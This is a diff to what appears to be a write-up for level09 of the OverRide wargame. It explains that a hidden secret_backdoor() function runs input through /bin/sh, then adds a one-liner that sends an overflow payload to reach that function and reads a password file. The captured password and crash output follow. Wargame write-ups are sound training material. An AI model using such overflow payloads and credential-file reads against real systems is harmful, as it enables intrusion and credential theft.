@@ -20,3 +20,16 @@ level09@OverRide:~$
 The program contains `secret_backdoor()` function which reads in at most 127 characters from `stdin` and stores them into the buffer pointed to by `command`. Then it executes  a command specified in `command` by calling `/bin/sh -c command`,
 
 At first glance, return address must be overwritten in order to redirect flow of the program into `secret_backdoor()` function.
+
+# Exploit
+```sh
+level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('I', 0x5555488c) + struct.pack('I', 0x5555))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, >: Msg @Unix-Dude
+>>: >: Msg sent!
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
+```
